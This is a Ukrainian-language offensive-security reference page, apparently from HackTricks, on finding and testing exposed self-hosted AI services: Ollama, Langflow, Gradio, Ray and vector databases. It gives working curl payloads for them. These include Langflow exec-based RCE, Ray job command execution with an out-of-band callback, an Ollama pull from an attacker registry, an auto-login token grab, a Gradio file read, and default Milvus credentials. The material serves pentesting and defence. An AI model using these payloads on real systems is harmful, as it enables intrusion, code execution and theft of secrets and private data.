# Відкриті self-hosted AI-сервіси

{{#include ../banners/hacktricks-training.md}}

Команди, які створюють функції на базі AI, часто запускають власні середовища виконання моделей, конструктори агентів, демонстраційні інтерфейси, обчислювальні кластери та векторні бази даних. Багато з цих інструментів розроблялися для ноутбука або закритої лабораторної мережі, тому **за замовчуванням не мають автентифікації** або постачаються з увімкненим спрощеним механізмом автентифікації. Якщо зловмисник може отримати доступ до такого сервісу, наслідки зазвичай належать до однієї з таких категорій:

- Безкоштовне використання GPU та моделей, а також викрадення приватних моделей.
- Витік промптів, документів та embeddings.
- Витік секретів із середовища процесу (ключів LLM-провайдерів, хмарних облікових даних).
- Виконання коду, оскільки деякі з цих API виконують код **як функцію**.

На цій сторінці описано, як знаходити такі сервіси та що перевіряти в кожному типі API. Щоб дізнатися про посилення захисту self-hosted сервера inference та витік через llama.cpp `/slots`, див. [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Про шкідливі файли моделей див. [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Надсилайте ці запити без облікових даних. Відповідь JSON з очікуваними полями дає змогу ідентифікувати продукт, а часто й версію, що підказує, які з наведених нижче перевірок застосовні. Порти відповідають задокументованим значенням за замовчуванням або портам, що використовуються в офіційних прикладах запуску.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Продукт | Поширений порт | Запит без автентифікації | Що його ідентифікує |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON із версією, список локальних моделей |
| Langflow | 7860 | `GET /api/v1/version` | JSON із версією Langflow |
| Gradio | 7860 | `GET /config` | Конфігурація застосунку з версією Gradio та ID компонентів |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, список надісланих завдань |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Значення heartbeat, версія Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Версія Qdrant, список колекцій |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Версія Weaviate, класи |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Список колекцій або помилка автентифікації |

Ці сервіси також часто публікують за reverse proxy під префіксом шляху (наприклад, `/ollama/` або `/ray/`), тож повторіть запити з усіма префіксами, знайденими в JavaScript-бандлах або документації API.

## API inference та керування моделями без автентифікації

Середовища виконання моделей зазвичай надають єдиний REST API, що поєднує маршрути inference з адміністративними маршрутами. Ollama — хороший приклад. Вона не має вбудованої автентифікації та за замовчуванням прив’язується до `127.0.0.1:11434`, а `OLLAMA_HOST` змінює адресу прив’язки.<sup>[[1]](#references)[[15]](#references)</sup> Офіційний Docker-образ задає `OLLAMA_HOST=0.0.0.0:11434` усередині контейнера, оголошує `EXPOSE 11434` і не містить інструкції `USER`, тому сервер працює в контейнері від імені root.<sup>[[16]](#references)</sup> `EXPOSE` не публікує порт на хості, тому доступність із хоста залежить від розгортання. У задокументованих командах `docker run` використовується `-p 11434:11434`, а Docker публікує таке зіставлення на всіх інтерфейсах хоста, якщо не вказано IP хоста.<sup>[[17]](#references)[[18]](#references)</sup>

Що кожна група маршрутів дає зловмиснику:<sup>[[2]](#references)</sup>

| Маршрути | Наслідки за відсутності автентифікації |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Список локальних і завантажених моделей, зокрема приватних кастомних моделей |
| `POST /api/show` | Відомості про модель, зокрема Modelfile, шаблон і **системний промпт** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Безкоштовний inference на обладнанні жертви |
| `POST /api/pull`, `/api/push` | Можливість змусити сервер завантажити модель із реєстру, вибраного зловмисником, або завантажити туди модель |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Створення, перезапис або видалення моделей |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Список моделей, повернутий без облікових даних, уже доводить наявність відкритого доступу. Користувацькі моделі часто містять внутрішній system prompt у `/api/show`. Pull-запит до вашого хоста доводить, що сервер отримує маніфести з реєстрів, вибраних зловмисником. Запит `/api/push` до вашого реєстру перетворює відкритий доступ на викрадення моделей. Не викликайте маршрути create або delete на реальних цілях.

Pull-запити з реєстрів також створюють поверхню для атак на парсер, оскільки сервер зберігає blob-файли, використовуючи значення з віддаленого маніфесту. У Probllama (CVE-2024-37032, виправлено в Ollama 0.1.34) значення `digest` у маніфесті використовувалося як ім’я файлу без перевірки. Тому зловмисний реєстр міг записувати файли за межами каталогу blob-файлів, використовуючи послідовності `../`. Надсилання підготовленого маніфесту, у якому `digest` вказував на локальний файл, призводило до витоку цього файлу в реєстр зловмисника. Wiz досягли RCE у Docker, де сервер працює від імені root: вони записали спільну бібліотеку й додали її до `/etc/ld.so.preload`, а потім викликали `/api/chat`, щоб новий процес завантажив її.<sup>[[15]](#references)</sup> Якщо runner може отримувати дані з довільних реєстрів, перевірте, як він перетворює поля маніфесту на шляхи.

## API, призначені для виконання коду

### API надсилання завдань

Фреймворки розподілених обчислень вважають виконання коду своєю основною функцією. Ray Jobs API на порту dashboard (8265) приймає shell-команду `entrypoint` і запускає її в кластері.<sup>[[19]](#references)</sup> Дослідження Oligo ShadowRay повідомляє, що Jobs API не має авторизації, а dashboard прив’язується до `0.0.0.0`. Відповідність CVE-2023-48022 є спірною, оскільки Ray розрахований на роботу лише в контрольованій мережі.<sup>[[20]](#references)</sup> У версії 2.52.0 Ray додав необов’язкову автентифікацію за токеном (`RAY_AUTH_MODE=token`). У Ray 2.59 вона ввімкнена за замовчуванням для локальних кластерів, запущених за допомогою `ray.init()`; `ray start --head` без доступного токена все ще може запускатися без автентифікації. Ray описує ширше впровадження автентифікації за замовчуванням у версії 2.61, тож перевіряйте розгорнуту версію та режим запуску, а не припускайте, що dashboard відкритий.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Дашборди такого типу також мають допоміжні маршрути, які варто перевіряти у старих версіях. До Ray 2.8.1 маршрут `/log_proxy?url=` отримував будь-яку URL-адресу HTTP(S) (SSRF до метаданих хмари), а `/api/v0/logs/file` приймав довільний шлях `filename`; обидва маршрути працювали без автентифікації.<sup>[[8]](#references)</sup>

### Ендпоїнти «валідації» коду, які виконують визначення функцій

Середовища для створення агентів, які приймають власні компоненти Python, іноді «валідують» код, розбираючи його за допомогою `ast` і виконуючи лише визначення функцій через `exec()`. Це небезпечно. Python обчислює **декоратори та значення аргументів за замовчуванням під час визначення функції**, тому розміщений там код виконується, навіть якщо тіло функції ніколи не запускається. `POST /api/v1/validate/code` у Langflow працював саме так і не вимагав автентифікації до версії 1.3.0 (CVE-2025-3248). Якщо згенерувати виняток, що містить вивід команди, ендпоїнт поверне цей вивід у відповіді:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Перевіряйте на цей шаблон будь-який endpoint, який компілює, перевіряє стилістично або іншим чином «перевіряє» код користувача, і за можливості використовуйте DNS callback як доказ.

### Маршрути автоматичного входу та токена суперкористувача за замовчуванням

Інструменти для одного користувача часто мають скорочений шлях, який автоматично входить у систему як адміністратор для кожного відвідувача. У Langflow, коли ввімкнено `AUTO_LOGIN`, `GET /api/v1/auto_login` повертає токени суперкористувача за замовчуванням будь-якому користувачу. Коли цей параметр вимкнено, маршрут відповідає `Auto login is disabled.`.<sup>[[23]](#references)</sup> У Langflow OSS від версії 1.0.0 до 1.10.0 цей параметр був увімкнений за замовчуванням (CVE-2026-9103). Поєднання цього маршруту з описаним вище автентифікованим маршрутом перевірки коду знову дає змогу виконати RCE без автентифікації (CVE-2026-9198, про вразливість повідомив Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> У поточних офіційних пакетах релізів та Docker-образах автоматичний вхід вимкнено, а для роботи потрібен пароль суперкористувача, але у гілках розробки він залишається ввімкненим.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Навіть без виконання коду токен суперкористувача дає доступ до кожного flow і збережених облікових даних провайдера. Перевірку пов’язаної передумови в автоматизованому тестуванні див. у [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Маршрути обслуговування файлів і RPC у демоінтерфейсах ML

Фреймворки для демо ML обслуговують завантажені й згенеровані файли через універсальний маршрут і дозволяють frontend викликати серверні допоміжні функції компонентів. У Gradio для цього є `/config`, `/upload` і `/file=<path>`.<sup>[[5]](#references)</sup> На будь-якому подібному фреймворку варто перевірити два сценарії:

- **Обхід каталогів із підкаталогу завантажень:** якщо маршрут файлів лише перевіряє, що шлях починається з каталогу тимчасових файлів, завантажте файл, щоб створити підкаталог, а потім підніміться на рівень вище за допомогою `../` або `%2e%2e%2f`. У Gradio версій 4.0–4.10 (CVE-2023-51449) була така вразливість.<sup>[[26]](#references)[[27]](#references)</sup> Надсилайте запит за допомогою `curl --path-as-is`, щоб клієнт не нормалізував шлях.
- **Довільний виклик методів:** endpoint, який викликає `getattr(component, fn_name)` із даними користувача, дозволяє зловмиснику викликати внутрішні допоміжні функції. До версії 4.13.0 так працював маршрут `/component_server` у Gradio. У версіях 4.3–4.12 функція `move_resource_to_block_cache` копіювала будь-який локальний файл у кеш, звідки його можна було завантажити через `/file=`. У версіях 3.47–3.50.2 інші допоміжні функції давали змогу читати файли та виконувати SSRF із повним читанням відповіді.<sup>[[26]](#references)[[28]](#references)</sup> Виправлений сервер повертає `Function not found.` для допоміжних функцій, не позначених як серверні.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

На Hugging Face Spaces секрети Space зберігаються як змінні середовища, тому `/proc/self/environ` — найцінніший файл. Horizon3 прочитали його за допомогою HTTP-заголовка `Range`.<sup>[[26]](#references)</sup>

## Векторні бази даних, які використовуються для RAG

RAG зберігає фрагменти оригінальних документів, їхні embedding-и та метадані у векторній базі даних, а асистент додає найкращі результати до свого prompt. Тому доступ на читання призводить до витоку **відкритого тексту приватних документів**. Доступ на запис дає зловмиснику змогу додавати фрагменти, які згодом потраплятимуть у prompt інших користувачів, що є постійною непрямою prompt injection (див. [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Для векторних баз даних із власним розгортанням перевірте, чи налаштована автентифікація або ввімкнений анонімний доступ:

- **Qdrant**: самостійно розгорнуті екземпляри прослуховують усі інтерфейси без автентифікації. Якщо налаштовано, ключ передається в заголовку `api-key` або як `Authorization: Bearer`. Можуть існувати ключі лише для читання та ключі для окремих колекцій.<sup>[[11]](#references)</sup>
- **Chroma**: автентифікацію вимкнено за замовчуванням. Для автентифікації за токеном використовується `Authorization` або `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: якщо ввімкнено анонімний доступ, запити без облікових даних автентифікуються як `user: anonymous` і отримують усі дозволи цього користувача.<sup>[[30]](#references)</sup>
- **Milvus**: автентифікацію вимкнено, якщо `common.security.authorizationEnabled` не має значення `true`. Коли її ввімкнено, користувач `root` за замовчуванням має пароль `Milvus`, а формат токена — `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Відповідь із приватними даними без облікових даних свідчить про витік. Якщо автентифікацію ввімкнено, окремо перевірте, чи не залишився незмінним обліковий запис за замовчуванням:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Перевірте, чи містять payloads текст документів, ідентифікатори користувачів або назви tenant. Щоб продемонструвати можливість запису, не забруднюючи production-дані, створіть і одразу видаліть порожню колекцію з чітко зрозумілою назвою — і лише якщо це дозволено межами scope.

Автентифікація на цих серверах також може виконуватися запізно. У Python FastAPI-сервері Chroma (версії від 1.0.0 принаймні до 1.5.8, CVE-2026-45829) маршрут створення колекції створював надану клієнтом функцію embedding до перевірки автентифікації. Конфігурація з посиланням на контрольовану зловмисником модель Hugging Face із `trust_remote_code: true` виконувала код зловмисника, навіть коли запит відхилявся. Rust frontend не постраждав.<sup>[[32]](#references)</sup> Якщо запит містить конфігурацію моделі чи плагіна, перевірте її без облікових даних і стежте за вихідним запитом до репозиторію моделі.

## References

- [1] [FAQ Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Документація API Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Вихідний код Langflow — кінцеві точки API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Вихідний код Gradio — routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Вихідний код Gradio — http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Вихідний код Ray — job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox — Ray, версії 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Вихідний код Chroma — значення клієнта за замовчуванням для Python](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Вихідний код Chroma — маршрути сервера FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant — безпека](https://qdrant.tech/documentation/security/)
- [12] [Специфікація OpenAPI Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Специфікація OpenAPI Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus — підключення до сервера Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz — Probllama: вразливість віддаленого виконання коду в Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Документація Docker для Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker — публікація та відкриття портів](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [REST API завдань Ray](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo — ShadowRay: перша відома кампанія атак, спрямована на AI-навантаження, що використовувала вразливості в реальних умовах](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Автентифікація за токеном у Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai — небезпечно за будь-якої швидкості: зловживання Python Exec для неавтентифікованого RCE у Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Вихідний код Langflow — маршрутизатор входу](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD — CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD — CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai — експлуатація вразливостей читання файлів у Gradio для викрадення секретів із Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Повідомлення безпеки Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Коміт із виправлення `/component_server` у Gradio](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook — автентифікація, вбудована в Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate — автентифікація](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus — автентифікація користувачів](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer — ChromaToast запущено до автентифікації](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Бюлетень безпеки IBM — неавтентифіковане віддалене виконання коду через обхід автоматичного входу та перевірки коду (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
